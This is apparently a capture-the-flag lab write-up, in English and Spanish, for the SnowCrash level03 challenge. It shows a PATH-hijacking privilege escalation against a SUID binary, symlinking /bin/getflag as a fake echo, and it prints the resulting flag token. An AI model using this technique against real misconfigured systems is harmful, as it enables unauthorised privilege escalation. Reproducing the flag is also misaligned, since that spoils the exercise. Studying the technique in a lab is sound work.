# Flag 03

## Tools Used:

* Basic Unix commands (`ls`, `ln`, `export`)
* Reverse engineering tools (Ghidra or GDB)

## Process:

Upon logging in as `level03`, listing the directory contents reveals an executable file:

```bash
level03@SnowCrash:~$ /bin/ls -la
```

Output:

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Running the executable:

```bash
level03@SnowCrash:~$ ./level03 
Exploit me
```

Decompiling the binary (with **Ghidra** or **GDB**) gives the following code:

```c
int main(int argc,char **argv,char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

### Key observations:

1. The file is owned by `flag03` and has **SUID** permissions, meaning the program runs with `flag03`'s privileges.
2. The program executes `/usr/bin/env echo Exploit me`, which can be exploited.

### Exploitation:

We can manipulate the `PATH` environment variable so that a custom version of `echo` is executed instead of the system's `echo`. Here's how:

1. Add `/tmp` to the beginning of the `PATH`:

```bash
export PATH=/tmp:$PATH
```

2. Create a symbolic link in `/tmp` pointing to `/bin/getflag` but name it `echo`:

```bash
ln -s /bin/getflag /tmp/echo
```

3. Run the vulnerable executable:

```bash
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

# Flag 03

## Herramientas Utilizadas:

* Comandos básicos de Unix (`ls`, `ln`, `export`)
* Herramientas de ingeniería inversa (Ghidra o GDB)

## Proceso:

Al iniciar sesión como `level03` y listar los archivos del directorio se encuentra un ejecutable:

```bash
level03@SnowCrash:~$ /bin/ls -la
```

Resultado:

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Al ejecutar el programa:

```bash
level03@SnowCrash:~$ ./level03 
Exploit me
```

Descompilando el binario (usando **Ghidra** o **GDB**) obtenemos el siguiente código:

```c
int main(int argc,char **argv,char **envp)
{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

### Observaciones clave:

1. El archivo pertenece a `flag03` y tiene permisos **SUID**, lo que significa que se ejecuta con los privilegios de `flag03`.
2. El programa ejecuta `/usr/bin/env echo Exploit me`, lo que se puede aprovechar.

### Explotación:

Podemos manipular la variable de entorno `PATH` para que un archivo `echo` falso sea ejecutado en lugar del real. Los pasos son:

1. Agregar `/tmp` al principio de `PATH`:

```bash
export PATH=/tmp:$PATH
```

2. Crear un enlace simbólico en `/tmp` apuntando a `/bin/getflag` y nombrarlo `echo`:

```bash
ln -s /bin/getflag /tmp/echo
```

3. Ejecutar el binario vulnerable:

```bash
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## Scripts Used:

None

## Flag:

```
qi0maab88jeaj46qoumi7maus
```